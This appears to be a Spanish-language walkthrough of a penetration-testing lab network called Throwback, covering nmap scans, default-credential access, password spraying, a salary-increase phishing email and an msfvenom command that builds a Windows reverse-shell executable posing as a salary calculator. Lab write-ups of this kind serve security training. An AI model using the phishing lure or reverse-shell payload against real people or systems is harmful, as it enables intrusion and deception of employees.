Tres maquinas estan expuestas al público:
```
THROWBACK-PROD
THROWBACK-FW01
THROWBACK-MAIL
```
Escaneamos la red completa para obtener la siguiente info
```
Nmap scan report for THROWBACK-FW01
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

Nmap scan report for 10.200.27.139
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for THROWBACK-PROD
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

Nmap scan report for THROWBACK-MAIL
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps
```
Vamos a repetir los escaneos pero ahora individualmente y con mayor profundidad esto nos dara varios datos importantes
```
|   DNS_Domain_Name: THROWBACK.local
```
Enumeramos las máquinas ahora de manera individual y encontramos una low level account, una lista de direcciones de correo y un firewall con default creds.

Obtuvimos RCE en la máquina del firewall y las creds para el usuario: HumphreyW

Tras esto hicimos password spray sobre el servidor email encontrando varias cuentas, tenemos un hallazgo inportante relaccionado con cambios de contraseña pero nada mas a simple vista.

Con tanto mail es buen momento para poner en marcha nuestra campaña de Phishing
```
Dears Crewmates:

Our Company will make an salary increase the next months for all the employers, to know the exact amount that we will add to your salary use the following program, in case of the program didnt work contact with the following employer only via email (compromised IT email account)

```
Y a esto le adjuntamos un payload de msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f exe -o CalculoIncrementoSueldo.exe
```
